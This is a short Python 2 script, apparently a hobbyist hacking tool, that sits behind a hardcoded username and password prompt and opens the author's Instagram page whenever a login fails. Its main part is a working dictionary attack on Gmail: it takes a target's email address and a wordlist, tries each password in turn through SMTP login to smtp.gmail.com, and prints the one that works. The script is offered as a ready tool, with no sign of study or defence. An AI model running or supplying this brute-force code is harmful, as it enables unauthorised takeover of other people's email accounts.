
import os
CorrectUsername = "g0sain"
CorrectPassword = "sim"

loop = 'true'
while (loop == 'true'):
    username = raw_input("\033[1;96m[#] \x1b[0;36m Enter Username\x1b[1;92m➤ ")
    if (username == CorrectUsername):
    	password = raw_input("\033[1;96m[#] \x1b[0;36m Enter Password\x1b[1;92m➤ ")
        if (password == CorrectPassword):
            print "Logged in successfully as " + username #fb-cloning-id SG
            loop = 'false'
        else:
            print "Wrong password!"
            os.system('xdg-open https://www.instagram.com/shubham_g0sain/?hl=en')
    else:
        print "Wrong username!"
        os.system('xdg-open https://www.instagram.com/shubham_g0sain/?hl=en')

import smtplib

smtpserver = smtplib.SMTP("smtp.gmail.com", 587)
smtpserver.ehlo()
smtpserver.starttls()


print('''
==========================================================
	    |      [Gmail] ==> 2             |
	    |--------------------------------|
	    | Instagram @shubham_g0sain      |
	    | CoDeD By ShuBhamg0sain         |
	    |--------------------------------|
==========================================================
	''')

user = raw_input("Enter the target's email address: ")
passwfile = raw_input("Enter the password file name: ")
passwfile = open(passwfile, "r")

for password in passwfile:
	try:
		smtpserver.login(user, password)

		print "[+] Password Found: %s" % password
		break;
	except smtplib.SMTPAuthenticationError:
		print "[!] Password Incorrect: %s" % password
